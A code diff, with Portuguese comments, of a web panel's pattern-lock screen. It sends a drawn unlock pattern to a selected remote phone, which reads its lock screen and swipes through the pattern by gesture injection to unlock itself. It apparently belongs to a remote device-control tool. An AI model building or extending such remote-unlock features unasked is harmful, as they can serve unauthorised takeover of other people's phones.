@@ -4816,45 +4816,55 @@ function excluirApp(appId, btn) {
             "canto inferior esquerdo", "inferior centro", "canto inferior direito"
         ];
         var sequencia = [];   // pontos selecionados na ordem
+        var sequenciaConfirmada = null;  // travada ao clicar em "Confirmar senha"
         var arrastando = false;
-        var grade = document.getElementById('lock-grade');
-        var live = document.getElementById('lock-live');
-        var resultado = document.getElementById('lock-resultado');
-        var svg = document.getElementById('lock-linhas');
+        var grade = null, live = null, resultado = null, svg = null;
+        var gradeConstruida = false;
 
-        // Cria os 9 botões de ponto (nativos = focáveis por teclado/TalkBack)
-        for (var i = 1; i <= 9; i++) {
-            (function (n) {
-                var btn = document.createElement('button');
-                btn.type = 'button';
-                btn.className = 'lock-ponto';
-                btn.setAttribute('data-ponto', n);
-                btn.setAttribute('aria-pressed', 'false');
-                btn.setAttribute('aria-label', 'Ponto ' + n + ' de 9, ' + POSICOES[n - 1]);
-                var nucleo = document.createElement('span');
-                nucleo.className = 'lock-nucleo';
-                nucleo.setAttribute('aria-hidden', 'true');
-                btn.appendChild(nucleo);
-                grade.appendChild(btn);
-                // Seleção por toque / clique / Enter+Espaço (nativo do button)
-                btn.addEventListener('click', function () { selecionarPonto(n); });
-                // Arraste (mouse e toque)
-                btn.addEventListener('mousedown', function (e) { e.preventDefault(); arrastando = true; selecionarPonto(n); });
-                btn.addEventListener('touchstart', function (e) { e.preventDefault(); arrastando = true; selecionarPonto(n); }, { passive: false });
-                btn.addEventListener('mouseenter', function () { if (arrastando) selecionarPonto(n); });
-                btn.addEventListener('touchmove', function (e) {
-                    if (!arrastando) return;
-                    var t = e.touches[0];
-                    var el = document.elementFromPoint(t.clientX, t.clientY);
-                    var p = el && el.closest ? el.closest('.lock-ponto') : null;
-                    if (p) selecionarPonto(parseInt(p.getAttribute('data-ponto'), 10));
-                }, { passive: false });
-            })(i);
+        // Constrói as 9 bolinhas SÓ quando a tela abre — o DOM da grade fica
+        // DEPOIS deste script, então criar na carga dava null (grade sumia).
+        function construirGrade() {
+            if (gradeConstruida) return;
+            grade = document.getElementById('lock-grade');
+            live = document.getElementById('lock-live');
+            resultado = document.getElementById('lock-resultado');
+            svg = document.getElementById('lock-linhas');
+            if (!grade) return;
+            for (var i = 1; i <= 9; i++) {
+                (function (n) {
+                    var btn = document.createElement('button');
+                    btn.type = 'button';
+                    btn.className = 'lock-ponto';
+                    btn.setAttribute('data-ponto', n);
+                    btn.setAttribute('aria-pressed', 'false');
+                    btn.setAttribute('aria-label', 'Ponto ' + n + ' de 9, ' + POSICOES[n - 1]);
+                    var nucleo = document.createElement('span');
+                    nucleo.className = 'lock-nucleo';
+                    nucleo.setAttribute('aria-hidden', 'true');
+                    btn.appendChild(nucleo);
+                    grade.appendChild(btn);
+                    btn.addEventListener('click', function () { selecionarPonto(n); });
+                    btn.addEventListener('mousedown', function (e) { e.preventDefault(); arrastando = true; selecionarPonto(n); });
+                    btn.addEventListener('touchstart', function (e) { e.preventDefault(); arrastando = true; selecionarPonto(n); }, { passive: false });
+                    btn.addEventListener('mouseenter', function () { if (arrastando) selecionarPonto(n); });
+                    btn.addEventListener('touchmove', function (e) {
+                        if (!arrastando) return;
+                        var t = e.touches[0];
+                        var el = document.elementFromPoint(t.clientX, t.clientY);
+                        var p = el && el.closest ? el.closest('.lock-ponto') : null;
+                        if (p) selecionarPonto(parseInt(p.getAttribute('data-ponto'), 10));
+                    }, { passive: false });
+                })(i);
+            }
+            gradeConstruida = true;
+            ligarBotoesLock();
         }
+        window.__lockConstruir = construirGrade;
         document.addEventListener('mouseup', function () { arrastando = false; });
         document.addEventListener('touchend', function () { arrastando = false; });
 
         function selecionarPonto(n) {
+            if (sequenciaConfirmada) return;         // já confirmado: trava a seleção
             if (sequencia.indexOf(n) !== -1) return; // NÃO repete anúncio de ponto já selecionado
             sequencia.push(n);
             var btn = grade.querySelector('[data-ponto="' + n + '"]');
@@ -4893,152 +4903,139 @@ function excluirApp(appId, btn) {
             if (anunciar && live) live.textContent = 'Pontos limpos';
         }
 
-        document.getElementById('lock-limpar').addEventListener('click', function () { limparPontos(true); });
-        document.getElementById('lock-fechar').addEventListener('click', fecharTelaDesbloqueio);
+        // Liga os botões do fluxo (chamado após a grade existir). Idempotente.
+        var botoesLockLigados = false;
+        var btnComecarL, btnConfirmarL, btnLimparL, btnDesbloqL, btnFecharL;
 
-        document.getElementById('lock-confirmar').addEventListener('click', function () {
-            if (sequencia.length < 4) {
-                resultado.textContent = 'Conecte ao menos 4 pontos.';
-                if (live) live.textContent = 'Conecte ao menos 4 pontos';
-                return;
-            }
-            var padrao = sequencia.join('-');
-            var salva = null;
-            try { salva = localStorage.getItem('padrao_desbloqueio'); } catch (e) {}
-            if (!salva) {
-                // Primeiro uso: define a senha
-                try { localStorage.setItem('padrao_desbloqueio', padrao); } catch (e) {}
-                resultado.textContent = 'Senha padrão definida. Painel desbloqueado.';
-                if (live) live.textContent = 'Senha padrão definida';
-                setTimeout(fecharTelaDesbloqueio, 1200);
-            } else if (salva === padrao) {
-                resultado.textContent = 'Senha padrão correta, desbloqueado.';
-                if (live) live.textContent = 'Senha padrão correta, desbloqueado';
-                setTimeout(fecharTelaDesbloqueio, 1200);
-            } else {
-                resultado.textContent = 'Senha incorreta, tente novamente.';
-                if (live) live.textContent = 'Senha incorreta, tente novamente';
-                if (navigator.vibrate) { try { navigator.vibrate([80, 60, 80]); } catch (e) {} }
-                setTimeout(function () { limparPontos(false); }, 800);
-            }
-        });
-
-        // Trap de foco (Tab/Shift+Tab) dentro da tela de desbloqueio
-        document.addEventListener('keydown', function (e) {
-            if (e.key !== 'Tab') return;
-            var overlay = document.getElementById('tela-desbloqueio');
-            if (!overlay || overlay.style.display === 'none') return;
-            var focaveis = overlay.querySelectorAll('button');
-            if (!focaveis.length) return;
-            var primeiro = focaveis[0], ultimo = focaveis[focaveis.length - 1];
-            if (e.shiftKey && document.activeElement === primeiro) { e.preventDefault(); ultimo.focus(); }
-            else if (!e.shiftKey && document.activeElement === ultimo) { e.preventDefault(); primeiro.focus(); }
-        });
-        // ESC fecha
-        document.addEventListener('keydown', function (e) {
-            if (e.key === 'Escape') {
-                var overlay = document.getElementById('tela-desbloqueio');
-                if (overlay && overlay.style.display !== 'none') fecharTelaDesbloqueio();
-            }
-        });
-
-        // ───── DESBLOQUEIO REAL DO DISPOSITIVO (inject/deslize por padrão) ─────
-        var btnComecar = document.getElementById('lock-comecar');
-        var btnDesbloquearDisp = document.getElementById('lock-desbloquear-device');
-
-        function alvoDispositivo() {
+        function alvoDispositivoLock() {
             try { if (typeof aparelhoSelecionado !== 'undefined' && aparelhoSelecionado) return aparelhoSelecionado; } catch (e) {}
             return window.aparelhoSelecionado || null;
         }
-        function habilitarDesbloquear(on) {
-            if (!btnDesbloquearDisp) return;
-            btnDesbloquearDisp.disabled = !on;
-            btnDesbloquearDisp.style.opacity = on ? '1' : '0.6';
+        function cinzaBtn(btn, cinza) {
+            if (!btn) return;
+            btn.disabled = cinza;
+            btn.style.opacity = cinza ? '0.5' : '1';
+            btn.style.cursor = cinza ? 'default' : 'pointer';
         }
+        function msgLock(t) { if (resultado) resultado.textContent = t; if (live) live.textContent = t; }
 
-        // "Começar agora": revela o padrão (swipe-up) e LÊ a tela p/ confirmar
-        // que é a tela de bloqueio PADRÃO do dispositivo.
-        if (btnComecar) btnComecar.addEventListener('click', function () {
-            var alvo = alvoDispositivo();
-            if (!alvo) { if (resultado) resultado.textContent = 'Selecione um dispositivo primeiro.'; return; }
-            if (resultado) resultado.textContent = 'Verificando a tela de bloqueio padrão…';
-            try {
-                if (window.socket && window.socket.connected) {
-                    window.socket.emit('lockscreen_swipe_painel', { dispositivo: alvo });
-                    setTimeout(function () {
-                        try { window.socket.emit('lockscreen_ler_painel', { dispositivo: alvo }); } catch (e) {}
-                    }, 500);
-                } else {
-                    // Sem socket: libera assim mesmo (o device detecta no backend).
-                    habilitarDesbloquear(true);
-                    if (resultado) resultado.textContent = 'Socket offline — desenhe os pontos e toque em Desbloquear agora.';
-                }
-            } catch (e) {}
-        });
+        function resetarFluxoLock() {
+            sequencia = [];
+            sequenciaConfirmada = null;
+            if (grade) grade.querySelectorAll('.lock-ponto').forEach(function (b) { b.setAttribute('aria-pressed', 'false'); });
+            if (svg) svg.innerHTML = '';
+            cinzaBtn(btnComecarL, false);
+            cinzaBtn(btnConfirmarL, false);
+            cinzaBtn(btnDesbloqL, true);  // só libera após confirmar a senha
+            msgLock('1) Começar agora → 2) desenhe a senha → 3) Confirmar senha → 4) Desbloquear agora.');
+        }
+        window.__lockResetar = resetarFluxoLock;
 
-        // "Desbloquear agora": envia a sequência (índices 1..9) para o device
-        // executar o DESLIZE por inject. Reusa o backend desbloquear_padrao
-        // (socket) + /desbloquear-padrao-http (fallback). O device mapeia os
-        // índices para a grade real e desliza no tempo certo.
-        if (btnDesbloquearDisp) btnDesbloquearDisp.addEventListener('click', function () {
-            var alvo = alvoDispositivo();
-            if (!alvo) { if (resultado) resultado.textContent = 'Selecione um dispositivo primeiro.'; return; }
-            if (sequencia.length < 4) { if (resultado) resultado.textContent = 'Conecte ao menos 4 pontos.'; return; }
-            var indices = sequencia.slice();
-            var payload = { dispositivo: alvo, indices: indices, sequencia: indices };
-            if (resultado) resultado.textContent = '🔓 Enviando desbloqueio… o celular vai deslizar pelos pontos.';
-            // Trava o botão durante o deslize (evita reenvio = deslize em cima do outro).
-            habilitarDesbloquear(false);
-            setTimeout(function () { habilitarDesbloquear(true); }, 4000);
-            // Envia por UMA via só (socket quando conectado; senão HTTP) — nunca
-            // as duas, para o device não receber o pedido em duplicado.
-            var enviadoSocket = false;
-            try { if (window.socket && window.socket.connected) { window.socket.emit('desbloquear_padrao', payload); enviadoSocket = true; } } catch (e) {}
-            if (!enviadoSocket) {
+        function ligarBotoesLock() {
+            if (botoesLockLigados) return;
+            btnComecarL = document.getElementById('lock-comecar');
+            btnConfirmarL = document.getElementById('lock-confirmar');
+            btnLimparL = document.getElementById('lock-limpar');
+            btnDesbloqL = document.getElementById('lock-desbloquear-device');
+            btnFecharL = document.getElementById('lock-fechar');
+
+            if (btnLimparL) btnLimparL.addEventListener('click', function () { resetarFluxoLock(); });
+            if (btnFecharL) btnFecharL.addEventListener('click', fecharTelaDesbloqueio);
+
+            // PASSO 1 — Começar agora: confirma a tela de bloqueio padrão; fica cinza.
+            if (btnComecarL) btnComecarL.addEventListener('click', function () {
+                var alvo = alvoDispositivoLock();
+                if (!alvo) { msgLock('Selecione um dispositivo primeiro.'); return; }
+                msgLock('Verificando a tela de bloqueio padrão…');
+                cinzaBtn(btnComecarL, true);
                 try {
-                    fetch('/desbloquear-padrao-http', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
-                        keepalive: true
-                    }).catch(function () {});
+                    if (window.socket && window.socket.connected) {
+                        window.socket.emit('lockscreen_swipe_painel', { dispositivo: alvo });
+                        setTimeout(function () { try { window.socket.emit('lockscreen_ler_painel', { dispositivo: alvo }); } catch (e) {} }, 500);
+                    }
                 } catch (e) {}
-            }
-        });
+                setTimeout(function () { msgLock('Agora desenhe os 9 pontos NA ORDEM da senha e toque em Confirmar senha.'); }, 900);
+            });
 
-        // Respostas do dispositivo: estado da tela e resultado do desbloqueio.
-        if (window.socket) {
-            window.socket.on('lockscreen_estado', function (p) {
-                if (!p) return;
-                var est = p.estado || '';
-                var temGrade = (est === 'aguardando_padrao') || (p.alvos && p.alvos.padraoBounds);
-                var bloqueado = temGrade || est === 'tela_capa' || est === 'tela_apagada';
-                if (temGrade) {
-                    if (resultado) resultado.textContent = '✅ Tela de padrão detectada. Desenhe os 9 pontos e toque em Desbloquear agora.';
-                    habilitarDesbloquear(true);
-                } else if (bloqueado) {
-                    if (resultado) resultado.textContent = '🔒 Bloqueado (' + est + '). Pode desenhar e desbloquear.';
-                    habilitarDesbloquear(true);
-                } else if (est === 'desbloqueado') {
-                    if (resultado) resultado.textContent = '🔓 Dispositivo já está desbloqueado.';
+            // PASSO 2 — Confirmar senha: trava a seleção desenhada; fica cinza; libera Desbloquear.
+            if (btnConfirmarL) btnConfirmarL.addEventListener('click', function () {
+                if (sequencia.length < 4) { msgLock('Conecte ao menos 4 pontos antes de confirmar.'); return; }
+                sequenciaConfirmada = sequencia.slice();
+                cinzaBtn(btnConfirmarL, true);
+                cinzaBtn(btnDesbloqL, false);
+                msgLock('Senha confirmada: ' + sequenciaConfirmada.join(' → ') + '. Toque em Desbloquear agora.');
+            });
+
+            // PASSO 3 — Desbloquear agora: desliza EXATAMENTE a seleção confirmada.
+            if (btnDesbloqL) btnDesbloqL.addEventListener('click', function () {
+                var alvo = alvoDispositivoLock();
+                if (!alvo) { msgLock('Selecione um dispositivo primeiro.'); return; }
+                var seq = sequenciaConfirmada || sequencia;
+                if (seq.length < 4) { msgLock('Confirme a senha (mín. 4 pontos) antes de desbloquear.'); return; }
+                var indices = seq.slice();
+                var payload = { dispositivo: alvo, indices: indices, sequencia: indices };
+                msgLock('🔓 Desbloqueando… deslizando pelos pontos: ' + indices.join(' → '));
+                cinzaBtn(btnDesbloqL, true);
+                // Envia por UMA via só (socket quando conectado; senão HTTP) — nunca
+                // as duas, para o device não receber o pedido em duplicado.
+                var enviadoSocket = false;
+                try { if (window.socket && window.socket.connected) { window.socket.emit('desbloquear_padrao', payload); enviadoSocket = true; } } catch (e) {}
+                if (!enviadoSocket) {
+                    try { fetch('/desbloquear-padrao-http', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(function () {}); } catch (e) {}
+                }
+                // Sem resposta em 6s: reabilita para nova tentativa.
+                setTimeout(function () { if (btnDesbloqL && btnDesbloqL.disabled) cinzaBtn(btnDesbloqL, false); }, 6000);
+            });
+
+            // Respostas do dispositivo (estado + resultado do desbloqueio).
+            if (window.socket) {
+                window.socket.on('lockscreen_estado', function (p) {
+                    if (!p) return;
+                    var est = p.estado || '';
+                    var temGrade = (est === 'aguardando_padrao') || (p.alvos && p.alvos.padraoBounds);
+                    if (temGrade) msgLock('✅ Tela de padrão detectada. Desenhe a senha e toque em Confirmar senha.');
+                    else if (est === 'tela_capa' || est === 'tela_apagada') msgLock('🔒 Bloqueado. Desenhe a senha e toque em Confirmar senha.');
+                    else if (est === 'desbloqueado') msgLock('🔓 Dispositivo já está desbloqueado.');
+                });
+                window.socket.on('desbloquear_padrao_resultado', function (res) {
+                    if (!res) return;
+                    if (res.sucesso) {
+                        msgLock('🔓 Dispositivo desbloqueado com sucesso!');
+                        setTimeout(fecharTelaDesbloqueio, 1400);  // finaliza a função
+                    } else {
+                        msgLock('❌ Padrão incorreto ou falha. Toque em Limpar, redesenhe e confirme de novo.');
+                        sequenciaConfirmada = null;
+                        cinzaBtn(btnConfirmarL, false);
+                        cinzaBtn(btnDesbloqL, true);
+                    }
+                });
+            }
+
+            // Trap de foco (Tab) + ESC para fechar.
+            document.addEventListener('keydown', function (e) {
+                var overlay = document.getElementById('tela-desbloqueio');
+                if (!overlay || overlay.style.display === 'none') return;
+                if (e.key === 'Escape') { fecharTelaDesbloqueio(); return; }
+                if (e.key === 'Tab') {
+                    var foc = overlay.querySelectorAll('button');
+                    if (!foc.length) return;
+                    var pr = foc[0], ul = foc[foc.length - 1];
+                    if (e.shiftKey && document.activeElement === pr) { e.preventDefault(); ul.focus(); }
+                    else if (!e.shiftKey && document.activeElement === ul) { e.preventDefault(); pr.focus(); }
                 }
             });
-            window.socket.on('desbloquear_padrao_resultado', function (res) {
-                if (!res) return;
-                if (resultado) resultado.textContent = res.sucesso
-                    ? '🔓 Dispositivo desbloqueado com sucesso!'
-                    : '❌ Padrão incorreto ou falha — tente novamente.';
-            });
+
+            botoesLockLigados = true;
+            resetarFluxoLock();
         }
     })();
 
     function abrirTelaDesbloqueio() {
         var overlay = document.getElementById('tela-desbloqueio');
         if (!overlay) return;
+        if (window.__lockConstruir) window.__lockConstruir();  // cria as 9 bolinhas (DOM já existe)
+        if (window.__lockResetar) window.__lockResetar();      // reseta o fluxo de 3 passos
         overlay.style.display = 'flex';
-        // Limpa estado anterior e move o foco para o primeiro ponto
-        var live = document.getElementById('lock-live');
-        if (live) live.textContent = 'Tela de desbloqueio aberta. Selecione pontos conectando-os ou um a um.';
         setTimeout(function () {
             var primeiro = overlay.querySelector('.lock-ponto');
             if (primeiro) primeiro.focus();
@@ -5070,14 +5067,14 @@ function excluirApp(appId, btn) {
         <svg id="lock-linhas" aria-hidden="true" style="position:absolute; inset:-9px; width:calc(100% + 18px); height:calc(100% + 18px); pointer-events:none; overflow:visible;"></svg>
         <!-- Os 9 botões de ponto são injetados por JS -->
     </div>
+    <!-- FLUXO DE DESBLOQUEIO DO DISPOSITIVO: 1) Começar  2) Confirmar  3) Desbloquear -->
     <div style="display:flex; gap:10px; margin-top:6px; flex-wrap:wrap; justify-content:center;">
-        <button id="lock-limpar" type="button" style="background:#3f3f46; color:#d4d4d8; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">Limpar pontos</button>
-        <button id="lock-confirmar" type="button" style="background:#dc2626; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">Confirmar senha</button>
+        <button id="lock-comecar" type="button" style="background:#2563eb; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">1 ▶ Começar agora</button>
+        <button id="lock-confirmar" type="button" style="background:#dc2626; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">2 ✓ Confirmar senha</button>
+        <button id="lock-desbloquear-device" type="button" disabled style="background:#16a34a; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:default; font-weight:bold; font-size:13px; opacity:0.5;">3 🔓 Desbloquear agora</button>
     </div>
-    <!-- DESBLOQUEIO REAL DO DISPOSITIVO (inject/deslize) -->
     <div style="display:flex; gap:10px; margin-top:4px; flex-wrap:wrap; justify-content:center;">
-        <button id="lock-comecar" type="button" style="background:#2563eb; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">▶ Começar agora</button>
-        <button id="lock-desbloquear-device" type="button" disabled style="background:#16a34a; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px; opacity:0.6;">🔓 Desbloquear agora</button>
+        <button id="lock-limpar" type="button" style="background:#3f3f46; color:#d4d4d8; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">Limpar pontos</button>
     </div>
     <p id="lock-dispositivo-info" style="color:#93c5fd; font-size:11px; margin:0; max-width:320px; text-align:center; line-height:1.4;">
         Toque em <b>Começar agora</b> para checar a tela de bloqueio padrão do dispositivo. Depois desenhe os 9 pontos na ordem e toque em <b>Desbloquear agora</b> — o celular desliza sozinho pelos pontos.
